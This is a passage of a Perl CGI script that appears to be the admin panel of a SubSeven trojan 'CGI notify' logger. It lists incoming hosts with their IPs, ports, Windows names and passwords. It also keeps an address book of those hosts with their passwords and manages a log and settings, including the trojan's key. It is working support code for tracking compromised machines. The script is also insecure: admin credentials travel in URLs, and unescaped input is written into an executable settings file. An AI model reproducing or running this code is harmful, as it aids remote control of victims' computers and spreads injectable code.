print "<td><center><b><font face = \"$Xfont\" size = \"$Xsize\">Network</td><td><center><font face = \"$Xfont\" size = \"$Xsize\"><b>Windows Name</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">ID</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">IP</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">PORT</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">TIME</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">PASS</td><tr>\n";
print "<td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td>\n";
foreach $line (@file) {
($ip, $port, $date, $user, $dayz, $monz, $win, $tpass, $connection) = split(/\|/, $line);
$lenip = 0;
@ipsb = split(/\./, $ip);
foreach $setip (@ipsb) {
$lenip++;
}
if ($Xsconnection eq "true") {
$connection = "DISABLED";
}
if ($lenip >= 5 and $connection eq "") {
$connection = "NETWORK";
}
else {
if ($connection eq "") {
$connection = "UNKNOWN";
}
}


if ($Xswin eq "true") {
$win = "DISABLED";
}
if ($Xsuser eq "true") {
$user = "DISABLED";
}
if ($Xsip eq "true") {
$ip = "DISABLED";
}
if ($Xsport eq "true") {
$port = "DISABLED";
}
if ($Xsdate eq "true") {
$date = "DISABLED";
}
if ($Xspass eq "true") {
$tpass = "DISABLED";
}
$showE = "yes";
if ($Xsip eq "true") {
}
else {
$nipX = $ip;
$nipX =~ s/\[//g;
$nipX =~ s/\]//g;
($ip1Z, $ip2Z, $ip3Z, $ip4Z) = split(/\./, $nipX);
if ($ip1 eq "*" or $ip1 eq $ip1Z) {
}
else {
$showE = "no";
}
if ($ip2 eq "*" or $ip2 eq $ip2Z) {
}
else {
$showE = "no";
}
if ($ip3 eq "*" or $ip3 eq $ip3Z) {
}
else {
$showE = "no";
}
if ($ip4 eq "*" or $ip4 eq $ip4Z) {
}
else {
$showE = "no";
}
}
if ($Xsport eq "true") {
}
else {
if ($portX eq "*" or $portX eq $port) {
}
else {
$showE = "no";
}
}
if ($Xswin eq "true") {
}
else {
if ($winX eq "*" or $winX eq $win) {
}
else {
$showE = "no";
}
}
if ($Xsconnection eq "true") {
}
else {
if ($connectionX eq "*" or $connectionX eq $connection) {
}
else {
$showE = "no";
}
}
if ($showE eq "yes") {
print "<tr><td><font face = \"$Xfont\" size = \"$Xsize\"><center>$connection</center></td><td><font face = \"$Xfont\" size = \"$Xsize\">$win</td><td><font face = \"$Xfont\" size = \"$Xsize\">$user</td><td><font face = \"$Xfont\" size = \"$Xsize\">$ip</td><td><font face = \"$Xfont\" size = \"$Xsize\">$port</td><td><font face = \"$Xfont\" size = \"$Xsize\">$date</td><td><font face = \"$Xfont\" size = \"$Xsize\">$tpass</td>\n";
}
}
print "</table></td></table><div align = \"right\"><font size = 1 face = \"$Xfont\">programmer: $prg</font></div></td></table>\n";

}
else {
$errortext = "The system administrator has set this program to require user authentication.  Please go back to the login page and enter a valid username and password.";
&derror;
&bforce;
}
}


####### ADMIN ADD ADDRESS TO BOOK ############

if ($opper eq "adr") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADD TO ADDRESS BOOK</font></center></b></td><tr><td>\n";
print "<form action = \"$script\" method = \"post\"><input type = \"hidden\" name = \"action\" value = \"adr2\"><input type = \"hidden\" name = \"user\" value = \"$username\"><input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Name: </td><td><input type = \"text\" name = \"name\" value = \"\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">IP DATA: </td><td><input type = \"text\" name = \"ipdata\" value = \"\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">PORT: </td><td><input type = \"text\" name = \"portd\" value = \"\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">windows name: </td><td><input type = \"text\" name = \"winname\" value = \"\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Password: </td><td><input type = \"text\" name = \"passd\" value = \"\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Notes: </td><td><input type = \"text\" name = \"notes\" value = \"\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Add Address\"></td></table></form></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


if ($opper eq "adr2") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
$Vname = $SUBIN{'name'};
$Vip = $SUBIN{'ipdata'};
$Vportd = $SUBIN{'portd'};
$Vwinname = $SUBIN{'winname'};
$Vpass = $SUBIN{'passd'};
$Vnotes = $SUBIN{'notes'};
if ($Vname eq "" or $Vip eq "" or $Vportd eq "" or $Vwinname eq "") {
$errortext = "You are missing required informaion!";
&derror;
}
else {
open(FILE, ">>subseven.adr");
print FILE "$Vip|$Vportd|$Vname|$Vwinname|$Vpass|$Vnotes|\n";
close(FILE);
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADDRESS ADDED</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">Address added successfully!\n";
print "</td></table>\n";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
}
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

####### ADMIN REMOVE ADDRESS FROM BOOK ############
if ($opper eq "radr") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {

print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">REMOVE FROM ADDRESS BOOK</font></center></b></td><tr><td>\n";
print "<form action = \"$script\" method = \"post\"><input type = \"hidden\" name = \"action\" value = \"remab\"><input type = \"hidden\" name = \"user\" value = \"$username\"><input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">IP DATA: </td><td><input type = \"text\" name = \"ipdata\" value = \"\" size = 23> (must be the same as the removing data)</td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Remove Address\"></td></table></form></td></table>\n";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";

}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "remab") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
$RVip = $SUBIN{'ipdata'};
if ($RVip eq "") {
$errortext = "Your missing required informaiton!";
&derror;
}
else {
$allrem = 0;
open(FILE, "subseven.adr");
@addresses = <FILE>;
close(FILE);
open(FILE, ">subseven.adr");
foreach $address (@addresses) {
($ip, $port, $user, $win, $tpass, $notes) = split(/\|/, $address);
if ($ip eq $RVip) {
$allrem++;
}
else {
print FILE "$address";
}
}
close(FILE);

print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADDRESS REMOVED</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">$allrem Address Removed Successfully!\n";
print "</td></table>\n";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";

}
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

############## DISABLE OPTIONS ##################

if ($opper eq "diso") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
if ($Xsconnection eq "true") {
$connectionz = " CHECKED";
}
if ($Xswin eq "true") {
$winz = " CHECKED";
}
if ($Xsuser eq "true") {
$userz = " CHECKED";
}
if ($Xsip eq "true") {
$ipz = " CHECKED";
}
if ($Xsport eq "true") {
$portz = " CHECKED";
}
if ($Xsdate eq "true") {
$datez = " CHECKED";
}
if ($Xspass eq "true") {
$tpassz = " CHECKED";
}


print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">DISABLE OPTIONS</font></center></b></td><tr><td>\n";
print "<form action = \"$script\" method = \"post\"><input type = \"hidden\" name = \"action\" value = \"diso2\"><input type = \"hidden\" name = \"user\" value = \"$username\"><input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Connection: </td><td><input type = \"checkbox\" value = \"yes\" name = \"connection\"$connectionz> Disable</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Windos name: </td><td><input type = \"checkbox\" value = \"yes\" name = \"winname\"$winz> Disable</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Server name: </td><td><input type = \"checkbox\" value = \"yes\" name = \"servername\"$userz> Disable</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Ip address: </td><td><input type = \"checkbox\" value = \"yes\" name = \"ipaddress\"$ipz> Disable</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Date and time: </td><td><input type = \"checkbox\" value = \"yes\" name = \"datetime\"$datez> Disable</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">password: </td><td><input type = \"checkbox\" value = \"yes\" name = \"spass\"$tpassz> Disable</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">port: </td><td><input type = \"checkbox\" value = \"yes\" name = \"sport\"$portz> Disable</td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Change Options\"></td></table></form></td></table>\n";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "diso2") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
$sconnection = $SUBIN{'connection'};
$swin = $SUBIN{'winname'};
$sid = $SUBIN{'servername'};
$sip = $SUBIN{'ipaddress'};
$sdate = $SUBIN{'datetime'};
$spass = $SUBIN{'spass'};
$sport = $SUBIN{'sport'};
open(FILE, "subseven.set");
@settings = <FILE>;
close(FILE);
$eqr = "=";
open(FILE, ">subseven.set");
foreach $setting (@settings) {
($dull, $settingx) = split(/\$/, $setting);
($variable, $rest) = split(/$eqr/, $settingx);
if ($variable eq "Xswin " or $variable eq "Xsuser " or $variable eq "Xsip " or $variable eq "Xsport " or $variable eq "Xsdate " or $variable eq "Xspass " or $variable eq "Xsconnection ") {
}
else {
print FILE "$setting";
}
}
if ($sconnection eq "yes") {
print FILE "\$Xsconnection = \"true\";\n";
}
else {
print FILE "\$Xsconnection = \"false\";\n";
}
if ($swin eq "yes") {
print FILE "\$Xswin = \"true\";\n";
}
else {
print FILE "\$Xswin = \"false\";\n";
}
if ($sid eq "yes") {
print FILE "\$Xsuser = \"true\";\n";
}
else {
print FILE "\$Xsuser = \"false\";\n";
}
if ($sip eq "yes") {
print FILE "\$Xsip = \"true\";\n";
}
else {
print FILE "\$Xsip = \"false\";\n";
}
if ($sport eq "yes") {
print FILE "\$Xsport = \"true\";\n";
}
else {
print FILE "\$Xsport = \"false\";\n";
}
if ($sdate eq "yes") {
print FILE "\$Xsdate = \"true\";\n";
}
else {
print FILE "\$Xsdate = \"false\";\n";
}
if ($spass eq "yes") {
print FILE "\$Xspass = \"true\";\n";
}
else {
print FILE "\$Xspass = \"false\";\n";
}
close(FILE);
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">OPTIONS CHANGED</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">Disable options changed Successfully!\n";
print "</td></table>\n";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";


}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

############## MEMBER MESSAGE ################

if ($opper eq "mmessage") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
$crk = "<br>";
@messageX = split(/$crk/, $Xmessage);
if ($messageX[0] eq "-") {
@messageX = ("");
}
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">EDIT MEMBER MESSAGE</font></center></b></td><tr><td>\n";
print "<form action = \"$script\" method = \"post\"><input type = \"hidden\" name = \"action\" value = \"mmessage2\"><input type = \"hidden\" name = \"user\" value = \"$username\"><input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<table border = 1 cellpadding = 3 cellspacing = 0 bordercolor = \"$Xborders\" bgcolor = \"$Xbgcolor\"><td><b>[ip]</b> = users ip</td><td><b>[tableborders]</b> = setting of the table border color</td><tr><td><b>[bgcolor]</b> = body background color</td><td><b>[tbgcolor]</b> = table background color</td><tr><td><b>[font]</b> = setting of font</td><td><b>[admin]</b> = admins username (use discouraged)</td><tr><td><b>[adminpass]</b> = administrative password (use discouraged)</td><td><b>[user]</b> = members usename if used</td><tr><td><b>[password]<b> = members password if used</td><td><b>[url]</b> = subseven.cgi's url</td><tr><td><b>[key]</b> = required subseven logging key</td><td><b>[title]</b> = setting title</td><tr><td><b>[date]</b> = date</td><td><b>[browser]</b> = users browser</td><tr><td><b>[htaccess]</b> = htaccess username (requires htaccess auth, default is NULL)</td><td><b>[referer]</b> = if request is POST, location of posting page, default is NULL</td></table><p>\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td valign = \"top\"><font face = \"$Xfont\" size = \"$Xsize\">Message: </td><td><textarea name = \"message\" rows = 8 cols = 70>\n";
foreach $line (@messageX) {
print "$line\n";
}
print "</textarea><br>HTML is ok. Leave blank for no message.<p>Example:<br>To add CGI notify to your server, please enter the following in the CGI notify window: <font color = \"red\">[url] [key]</font><p> This example would display:<br>To add CGI notify to your server, please enter the following in the CGI notify window: <font color = \"red\">http://$ENV{'SERVER_NAME'}$ENV{'SCRIPT_NAME'} $Xkey</font><br></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Post Message\"></td></table></form></td></table>\n";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "mmessage2") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
$messagep = $SUBIN{'message'};
$messagep =~ tr/\r/ /;
@rmessage = split(/\n/, $messagep);
$messagep = "";
foreach $line (@rmessage) {
if ($messagep eq "") {
$messagep = "$line";
}
else {
$messagep = "$messagep<br>$line";
}
}
$messagep =~ s/\"/\\"/g;
$messagep =~ s/\&/\\&/g;
$messagep =~ s/\$/\\\$/g;
$messagep =~ s/\@/\\@/g;
open(FILE, "subseven.set");
@settings = <FILE>;
close(FILE);
open(FILE, ">subseven.set");
foreach $setting (@settings) {
$eqr = " = ";
($variable, $rest) = split(/$eqr/, $setting);
if ($variable eq "\$Xmessage") {
}
else {
print FILE "$setting";
}
}
if ($messagep eq "") {
$messagep = "-";
}
print FILE "\$Xmessage = \"$messagep\";\n";
close(FILE);

print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">MESSAGE POSTED</font></center></b></td><tr><td>\n";
if ($messagp eq "") {
print "<font face = \"$Xfont\" size = \"$Xsize\">Message Removed Successfully!\n";
}
else {
print "<font face = \"$Xfont\" size = \"$Xsize\">Message Changed Successfully!\n";
print "<hr>\n";
print "<p>$messagep<p>";
}
print "</td></table>\n";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


############### CHANGE USERNAME AND PASSWORD ##################3
if ($opper eq "cp") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE PASSWORD</font></center></b></td><tr><td>\n";
print "<form action = \"$script\" method = \"post\"><input type = \"hidden\" name = \"action\" value = \"chinfo\"><input type = \"hidden\" name = \"user\" value = \"$username\"><input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">UserName: </td><td><input type = \"text\" name = \"nwuser\" value = \"$Xrequser\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">PassWord: </td><td><input type = \"text\" name = \"nwpass\" value = \"$Xreqpass\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Change Username/Passowrd\"></td></table></form></td></table>\n";

}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "chinfo") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
$usern = $SUBIN{'nwuser'};
$passn = $SUBIN{'nwpass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE PASSWORD</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\" size = \"$Xsize\">Your information has been changed.<br>\n";
open(FILE, "subseven.set");
@file = <FILE>;
close(FILE);
open(FILE, ">subseven.set");
foreach $line (@file) {
$spla = "reqpass";
$splb = "requser";
$a = 0;
$b = 0;
@a = split(/$spla/, $line);
@b = split(/$splb/, $line);
foreach $kkm (@a) {
$a++;
}
foreach $kkl (@b) {
$b++;
}
if ($a eq 2) {
print FILE "\$Xreqpass = \"$passn\";\n";
print "the Password has successfully been changed.<br>\n";
}
else {
if ($b eq 2) {
print FILE "\$Xrequser = \"$usern\";\n";
print "The username has successfully been changed.<br>\n";
}
else {
print FILE "$line";
}
}

}
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$usern&pass=$passn\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


########### CLEAR LIST ##############

if ($opper eq "cl") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CLEAR LIST</font></center></b></td><tr><td>\n";
print "<center><font face = \"$Xfont\" size = \"$Xsize\">This option will clear all IP's from the list.  You should do this often to reduce the size of the log file.<p>Are you sure you want to do this?<br>";
print "<table border = 0 cellpadding = 0 cellspacing = 0><td><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=cl2&user=$username&pass=$password\">[ YES ]</a></td><td width = 30></td><td><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ NO ]</a></td></table></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


if ($opper eq "cl2") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE PASSWORD</font></center></b></td><tr><td>\n";
open(FILE, ">subseven.log");
close(FILE);
print "<font face = \"$Xfont\" size = \"$Xsize\">The IP log has been cleared.";
print "<center></b><p><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

########## CHANGE SETTINGS ############3
if ($opper eq "s") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE SETTINGS</font></center></b></td><tr><td>\n";
print "<center><font face = \"$Xfont\" size = \"$Xsize\">please fill out the following information</center>\n";
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"user\" value = \"$username\">\n";
print "<input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"snew\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Require Password:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><select name = \"rpass\"><option value = \"$Xauth\">$Xauth<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Support multi users:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><select name = \"smul\"><option value = \"$Xmulti\">$Xmulti<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Delete IP's after:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><select name = \"dent\"><option value = \"$Xdent\">$Xdent<option value = \"2\">2<option value = \"3\">3<option value = \"4\">4<option value = \"5\">5<option value = \"6\">6<option value = \"7\">7</select> days</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">background color:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"bgcolor\" value = \"$Xbgcolor\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">text color:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"txcolor\" value = \"$Xtext\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">text font:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"txfont\" value = \"$Xfont\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">text size:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"txsize\" value = \"$Xsize\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">link color:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"lncolor\" value = \"$Xlinks\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">display ads:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><select name = \"dispad\"><option value = \"$Xads\">$Xads<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">table border color:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"tbcolor\" value = \"$Xborders\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">table backgroud color:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"tabelbg\" value = \"$Xtables\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Reqire SubSeven Pass:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><select name = \"rs7pass\"><option value = \"$Xsubpass\">$Xsubpass<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">subseven pass:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"fkey\" value = \"$Xkey\" size = 6 maxlength = 5>5 numbers</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">admin username:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"nuser\" value = \"$Xrequser\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">admin password:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"npass\" value = \"$Xreqpass\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">use IMG tags:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><select name = \"imgt\"><option value = \"$Ximages\">$Ximages</select> Currently not supported.</td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">document title:</td><td><font face = \"$Xfont\" size = \"$Xsize\"><input type = \"text\" name = \"dtitle\" value = \"$Xtitle\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Change Settings\"></td></table></form></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "snew") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
$rpass = $SUBIN{'rpass'}; 
$smul = $SUBIN{'smul'}; 
$bgcolor = $SUBIN{'bgcolor'}; 
$txcolor = $SUBIN{'txcolor'}; 
$txfont = $SUBIN{'txfont'}; 
$txsize = $SUBIN{'txsize'}; 
$lncolor = $SUBIN{'lncolor'}; 
$dispad = $SUBIN{'dispad'}; 
$tbcolor = $SUBIN{'tbcolor'}; 
$tabelbg = $SUBIN{'tabelbg'}; 
$rs7pass = $SUBIN{'rs7pass'}; 
$fkey = $SUBIN{'fkey'}; 
$nuser = $SUBIN{'nuser'}; 
$npass = $SUBIN{'npass'}; 
$imgt = $SUBIN{'imgt'}; 
$dtitle = $SUBIN{'dtitle'}; 
$dent = $SUBIN{'dent'}; 

if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE SETTINGS</font></center></b></td><tr><td><font face = \"$Xfont\" size = \"$Xsize\">\n";
if ($rpass eq "" or $smul eq "" or $bgcolor eq "" or $txcolor eq "" or $txfont eq "" or $lncolor eq "" or $dispad eq "" or $tbcolor eq "" or $tabelbg eq "" or $rs7pass eq "" or $fkey eq "" or $nuser eq "" or $npass eq "" or $imgt eq "" or $dtitle eq "") {
$errortext = "Required information was not filled out.  please go back and fill out all inputs.";
&derror;
}
else {
open(FILE, ">subseven.set");
print FILE "\$Xauth = \"$rpass\";\n";
print "01) authentication required: $rpass<br>\n";
print FILE "\$Xmulti = \"$smul\";\n";
print "02) support multi users: $smul<br>\n";
print FILE "\$Xbgcolor = \"$bgcolor\";\n";
print "03) background color: $bgcolor<br>\n";
print FILE "\$Xtext = \"$txcolor\";\n";
print "04) text color: $txcolor<br>\n";
print FILE "\$Xfont = \"$txfont\";\n";
print "05) text font: $txfont<br>\n";
print FILE "\$Xlinks = \"$lncolor\";\n";
print "06) link colors: $lncolor<br>\n";
print FILE "\$Xads = \"$dispad\";\n";
print "07) display ads: $dispad<br>\n";
print FILE "\$Xborders = \"$tbcolor\";\n";
print "08) table border color: $tbcolor<br>\n";
print FILE "\$Xtables = \"$tabelbg\";\n";
print "09) table bgcolor: $tabelbg<br>\n";
print FILE "\$Xsubpass = \"$rs7pass\";\n";
print "10) require subseven pass: $rs7pass<br>\n";
print FILE "\$Xkey = \"$fkey\";\n";
print "11) file key, used as sub7 pass: $fkey<br>\n";
print FILE "\$Xrequser = \"$nuser\";\n";
print "12) admin username: $nuser<br>\n";
print FILE "\$Xreqpass = \"$npass\";\n";
print "13) admin password: $npass<br>\n";
print FILE "\$Ximages = \"$imgt\";\n";
print "14) display images: $imgt<br>\n";
print FILE "\$Xtitle = \"$dtitle\";\n";
print "15) document title: $dtitle<br>\n";
print FILE "\$Xdent = \"$dent\";\n";
print "16) auto delete: $dent days old<br>\n";
print FILE "\$Xsize = \"$txsize\";\n";
print "17) font size: $txsize<br>\n";
if ($Xmessage eq "") {
}
else {
print FILE "\$Xmessage = \"$Xmessage\";\n";
}
if ($Xsconnection eq "true") {
print FILE "\$Xsconnection = \"$Xsconnection\";\n";
}
else {
print FILE "\$Xsconnection = \"false\";\n";
}
if ($Xsport eq "true") {
print FILE "\$Xsport = \"$Xsport\";\n";
}
else {
print FILE "\$Xsport = \"false\";\n";
}
